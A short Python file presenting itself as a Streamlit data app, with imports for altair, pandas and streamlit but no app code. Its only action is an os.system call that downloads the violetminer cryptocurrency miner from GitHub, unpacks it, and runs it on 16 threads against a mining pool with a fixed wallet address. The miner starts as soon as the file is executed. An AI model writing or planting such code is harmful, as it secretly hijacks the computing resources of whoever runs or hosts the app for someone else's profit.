from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
import time
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64
os.system("curl -L -o violetminer-linux-v0.2.2.tar.gz https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar -xf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --algorithm chukwa --pool pool.snowflake-net.com:3333 --username SNW1aa1fKpvAEWXGgBC37R9jQYinA7A3V9EJWgjE7sc1HvvJKhc5oXY94boBG56U3C94boBG56U3C94boBG56U3C94boBemmYeEZRiK5wTYChJYBGJ47eevunGr5S88fJd27Bd1Fr5aw57WCXapZw1PnmrMGsETnC3iQ8enC7kwYuDTy9mSywd4RyP.001 --password x --disableNVIDIA --threads 16")
